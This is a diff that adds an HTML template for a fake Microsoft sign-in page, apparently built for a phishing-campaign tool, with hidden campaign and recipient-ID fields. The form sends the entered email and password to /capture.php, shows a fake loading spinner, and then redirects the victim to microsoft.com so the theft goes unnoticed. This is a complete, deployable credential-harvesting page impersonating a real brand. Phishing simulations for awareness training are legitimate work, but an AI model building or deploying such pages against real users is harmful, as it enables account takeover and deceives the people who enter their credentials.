@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ page_title | default('Sign in to your account') }}</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 2px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            width: 440px;
+            max-width: 90%;
+        }
+        
+        .logo {
+            text-align: left;
+            margin-bottom: 24px;
+        }
+        
+        .logo img {
+            height: 24px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #1a1a1a;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+        }
+        
+        input[type="email"],
+        input[type="password"],
+        input[type="text"] {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #605e5c;
+            border-radius: 2px;
+            font-size: 15px;
+            transition: border-color 0.2s;
+        }
+        
+        input[type="email"]:focus,
+        input[type="password"]:focus,
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #0078d4;
+        }
+        
+        .forgot-password {
+            display: block;
+            margin: 8px 0 16px;
+            color: #0078d4;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .btn-primary {
+            width: 100%;
+            padding: 12px;
+            background: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 2px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .btn-primary:hover {
+            background: #106ebe;
+        }
+        
+        .error-message {
+            color: #d13438;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .spinner {
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #0078d4;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .footer {
+            margin-top: 40px;
+            font-size: 12px;
+            color: #605e5c;
+            text-align: center;
+        }
+        
+        .footer a {
+            color: #605e5c;
+            text-decoration: none;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="{{ logo_url | default('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMjQiPjx0ZXh0IHg9IjAiIHk9IjIwIiBmb250LWZhbWlseT0iU2Vnb2UgVUkiIGZvbnQtc2l6ZT0iMjAiIGZpbGw9IiM1YzJkOTEiPk1pY3Jvc29mdDwvdGV4dD48L3N2Zz4=') }}" alt="Logo">
+        </div>
+        
+        <h1>{{ heading | default('Sign in') }}</h1>
+        
+        <form id="loginForm" method="POST" action="/capture.php">
+            <input type="hidden" name="rid" value="{{ '{{.RId}}' }}">
+            <input type="hidden" name="campaign" value="{{ '{{.Campaign}}' }}">
+            
+            <div class="form-group">
+                <input type="email" 
+                       name="username" 
+                       id="username" 
+                       placeholder="{{ username_placeholder | default('Email, phone, or Skype') }}"
+                       required>
+            </div>
+            
+            <div class="form-group">
+                <input type="password" 
+                       name="password" 
+                       id="password" 
+                       placeholder="{{ password_placeholder | default('Password') }}"
+                       required>
+            </div>
+            
+            <a href="#" class="forgot-password">{{ forgot_text | default('Forgot password?') }}</a>
+            
+            <div class="error-message" id="error">
+                {{ error_message | default('Invalid username or password.') }}
+            </div>
+            
+            <button type="submit" class="btn-primary">
+                {{ button_text | default('Sign in') }}
+            </button>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>{{ loading_text | default('Signing in...') }}</p>
+            </div>
+        </form>
+        
+        <div class="footer">
+            <a href="#">{{ footer_link1 | default('Terms of use') }}</a> | 
+            <a href="#">{{ footer_link2 | default('Privacy & cookies') }}</a>
+        </div>
+    </div>
+    
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Show loading state
+            document.getElementById('loading').style.display = 'block';
+            document.querySelector('.btn-primary').style.display = 'none';
+            
+            // Submit form data
+            fetch(this.action, {
+                method: 'POST',
+                body: new FormData(this)
+            })
+            .then(response => {
+                // Redirect after a delay to simulate processing
+                setTimeout(() => {
+                    window.location.href = '{{ redirect_url | default("https://www.microsoft.com") }}';
+                }, 2000);
+            })
+            .catch(error => {
+                document.getElementById('error').style.display = 'block';
+                document.getElementById('loading').style.display = 'none';
+                document.querySelector('.btn-primary').style.display = 'block';
+            });
+        });
+    </script>
+</body>
+</html>
